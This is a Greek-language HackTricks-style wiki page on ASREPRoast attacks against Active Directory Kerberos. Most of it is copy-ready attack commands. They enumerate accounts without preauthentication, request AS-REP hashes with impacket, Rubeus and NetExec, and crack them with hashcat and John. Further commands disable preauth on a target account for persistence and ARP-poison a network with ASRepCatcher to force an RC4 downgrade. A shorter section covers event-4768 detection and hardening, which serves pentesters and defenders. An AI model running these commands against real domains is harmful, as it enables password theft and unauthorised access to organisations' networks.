# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες οι οποίοι δεν διαθέτουν το **απαιτούμενο attribute προ-αυθεντικοποίησης Kerberos**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους attackers να ζητήσουν authentication για έναν χρήστη από τον Domain Controller (DC), χωρίς να χρειάζονται τον κωδικό πρόσβασης του χρήστη. Στη συνέχεια, ο DC απαντά με ένα μήνυμα κρυπτογραφημένο με ένα key που προκύπτει από τον κωδικό πρόσβασης του χρήστη, το οποίο οι attackers μπορούν να επιχειρήσουν να κάνουν crack offline, ώστε να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι βασικές απαιτήσεις για αυτή την επίθεση είναι:

- **Έλλειψη προ-αυθεντικοποίησης Kerberos**: Οι χρήστες-στόχοι δεν πρέπει να έχουν ενεργοποιημένη αυτή τη λειτουργία ασφαλείας.
- **Σύνδεση στον Domain Controller (DC)**: Οι attackers χρειάζονται πρόσβαση στον DC για να στείλουν requests και να λάβουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικός domain λογαριασμός**: Η ύπαρξη domain λογαριασμού επιτρέπει στους attackers να εντοπίζουν πιο αποτελεσματικά τους ευάλωτους χρήστες μέσω LDAP queries. Χωρίς έναν τέτοιο λογαριασμό, οι attackers πρέπει να μαντεύουν usernames.

#### Enumerating vulnerable users (χρειάζονται domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτημα μηνύματος AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Το Rubeus ζητά **RC4** από προεπιλογή, επομένως το Event ID **4768** συνήθως εμφανίζει **preauth type 0** και **ticket encryption type 0x17**. Αν προσθέσετε **`/aes`** (ή αν το RC4 είναι απενεργοποιημένο για το target), αναμένετε **AES etypes**.<sup>[[2]](#references)</sup>

#### Γρήγορα one-liners (Linux)

- Κάντε πρώτα enumerate στα πιθανά targets (π.χ. από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Κάντε roast μια ολόκληρη λίστα usernames χωρίς valid creds χρησιμοποιώντας NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Αν έχετε creds, αφήστε το NetExec να κάνει query στο LDAP και να ζητήσει για εσάς κάθε roastable account: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Αν το output ξεκινά με **`$krb5asrep$23$`**, κάντε crack με το Hashcat **`-m 18200`**. Αν ξεκινά με **`$krb5asrep$17$`** ή **`$krb5asrep$18$`**, προτιμήστε το John με **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Μην υποθέτετε ότι κάθε AS-REP roast είναι RC4. Τα σύγχρονα εργαλεία μπορούν να επιστρέψουν **RC4** (`$krb5asrep$23$`) ή **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), ανάλογα με το ζητούμενο/διαπραγματευόμενο enctype. Το **`hashcat -m 18200`** είναι για **etype 23**, ενώ το **John** χειρίζεται απευθείας το `krb5asrep` για **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Επιβάλετε να μην απαιτείται **preauth** για έναν χρήστη στον οποίο έχετε δικαιώματα **GenericAll** (ή δικαιώματα εγγραφής ιδιοτήτων):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Detection and hardening

Ένα επιτυχημένο roast παράγει ένα event **4768** στον DC με `Status=0x0` και `PreAuthType=0`. Μην απαιτείτε RC4 για την ανίχνευση: το `TicketEncryptionType=0x17` είναι χρήσιμο σήμα αδύναμης κρυπτογράφησης, αλλά ένας attacker μπορεί να ζητήσει AES (τιμές event log `0x11`/`0x12`). Σε Windows Server 2016 και νεότερα, με το cumulative update της 14ης Ιανουαρίου 2025 (ή νεότερο), η έκδοση 2 του event 4768 εμφανίζει επίσης τα `ClientAdvertizedEncryptionTypes`, τα υποστηριζόμενα etypes του account/DC και τα διαθέσιμα keys.<sup>[[5]](#references)</sup>

Ένα πρακτικό hunt επισημαίνει έναν client που διαφημίζει μόνο RC4 ενώ το account διαθέτει AES keys και, στη συνέχεια, συσχετίζει bursts από μία source IP σε αρκετούς no-preauth users. Καθορίστε baseline για τις νόμιμες εξαιρέσεις αντί να δημιουργείτε alert για κάθε event με `PreAuthType=0`.

Η μόνιμη λύση είναι να αποεπιλέξετε το **Do not require Kerberos preauthentication** σε κάθε user που δεν το χρειάζεται απολύτως και να αλλάξετε τα εκτεθειμένα account passwords. Αν μια εξαίρεση δεν μπορεί να καταργηθεί, χρησιμοποιήστε ένα μεγάλο, τυχαία δημιουργημένο password και τα ελάχιστα δυνατά privileges. Η απενεργοποίηση του RC4 αυξάνει το cracking cost, αλλά δεν εξαλείφει τη δυνατότητα roast, επειδή οι AES AS-REP responses παραμένουν ευάλωτες σε offline cracking.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast χωρίς credentials

Ένας on-path attacker μπορεί να καταγράψει το AS-REP που επιστρέφεται κατά τη διάρκεια μιας κανονικής, preauthenticated AS exchange και να μορφοποιήσει το encrypted μέρος του για offline cracking. Σε αντίθεση με το κλασικό ASREPRoasting, αυτό δεν απαιτεί `DONT_REQ_PREAUTH`. Ωστόσο, επιστρέφει αποτελέσματα μόνο για accounts των οποίων η Kerberos exchange πράγματι intercepted. Το **ASRepCatcher** αποκτά τη θέση με one-way ARP poisoning από προεπιλογή ή μπορεί να καταναλώσει traffic από άλλη MitM technique με `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Αν θέλετε το σχετικό no-credential trick που επιστρέφει ένα **service ticket** αντί για ένα **TGT** από έναν no-preauth principal, δείτε το [Kerberoast](kerberoast.md).

Σε `relay` mode, το [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) προωθεί τα intercepted AS-REQs και επιβάλλει **RC4** όταν και οι δύο πλευρές εξακολουθούν να το επιτρέπουν. Το `listen` δεν τροποποιεί τα packets και επομένως καταγράφει όποιο enctype διαπραγματεύτηκαν ο client και ο DC. Περιορίστε το poisoning με `-t`/`-tf` αντί να αγγίζετε ολόκληρο το subnet, όταν αυτό είναι δυνατό.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Συμβάν 4768: Ζητήθηκε ticket ελέγχου ταυτότητας Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
